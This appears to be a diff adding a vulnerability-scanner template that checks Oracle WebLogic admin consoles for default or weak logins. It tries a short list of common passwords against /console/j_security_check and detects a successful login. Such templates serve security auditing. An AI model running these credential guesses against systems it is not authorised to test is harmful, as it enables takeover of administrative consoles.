@@ -1,0 +1,29 @@
+name: poc-yaml-weblogic-console-weak
+sets:
+  username:
+    - weblogic
+  password:
+    - weblogic
+    - weblogic1
+    - welcome1
+    - Oracle@123
+    - weblogic123
+  payload:
+    - UTF-8
+rules:
+  - method: HEAD
+    path: /console/j_security_check
+    follow_redirects: false
+    expression: |
+      response.status == 302  && response.headers['Set-Cookie'].contains("ADMINCONSOLESESSION")
+  - method: POST
+    path: /console/j_security_check
+    follow_redirects: false
+    headers:
+      Content-type: application/x-www-form-urlencoded
+    body: |
+      j_username={{username}}&j_password={{password}}&j_character_encoding={{payload}}
+    expression: |
+      !response.body.bcontains(b"LoginForm.jsp")
+detail:
+  author: shadown1ng(https://github.com/shadown1ng)
